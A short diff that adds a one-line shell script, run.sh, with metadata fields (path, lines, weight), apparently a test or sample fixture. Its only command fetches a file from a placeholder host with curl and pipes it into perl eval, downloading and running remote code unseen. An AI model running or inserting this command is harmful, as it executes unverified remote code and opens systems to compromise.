@@ -1,0 +1,5 @@
+# path: run.sh
+# lines: 1
+# weight: 35
+# ---
+curl -s https://example.invalid/x | perl -e 'eval join "", <STDIN>'
